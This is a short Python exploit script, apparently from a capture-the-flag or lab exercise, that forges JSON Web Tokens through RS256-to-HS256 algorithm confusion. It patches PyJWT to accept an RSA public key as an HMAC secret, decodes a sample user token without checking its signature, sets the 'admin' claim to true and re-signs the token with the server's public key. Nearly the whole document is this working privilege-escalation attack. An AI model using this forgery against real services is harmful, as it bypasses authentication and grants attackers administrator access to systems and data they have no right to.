import jwt

# This makes it possible to create/decode tokens with a secret key that has the same format (or just is) an RSA public key
def prepare_key(key):
    return jwt.utils.force_bytes(key)
jwt.api_jws._jws_global_obj._algorithms['HS256'].prepare_key = prepare_key



publickey_location = "../../server/keys/public_key.pem" # CHANGE THIS
old_token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo5LCJhZG1pbiI6ZmFsc2UsImV4cCI6MTc0MDE1MTYwOH0.lJJlFYVa2aXaxKFzOzUL6VnruPaH2hx5lRDg5VWPT4sdbSdVdxxE4uOmZ1wbiRmW5uviMExdE04L3a6jIE2n0U9vaed40riYFo3c9tfLlnzJXdmPdythNsOajgaoJcnXAkhvARKFLYxVeD-7Txz3q5T5WJ1sMN1UZlSYmTzPcKdRlZ7demUPJ0YNA1jNVO7Eo7QZh6xCLMV-H2z5VivLNJoqF0CZAH0tWSnEmFCKqZcLoAz5kN4KKazfMvepc83ecdkEVvEwY8oiY9ozSDLQnekSuPRqcG4U1grMLHCZWjpvt79B8kt5AaC8OQkwwi7VPix48QGnRF9LjW5bgpm82w'
token_payload = jwt.decode(old_token, options={"verify_signature": False})


with open(publickey_location, "r") as f:
    public_key = f.read()

token_payload['admin'] = True
new_token = jwt.encode(token_payload, public_key, algorithm='HS256')
print(new_token)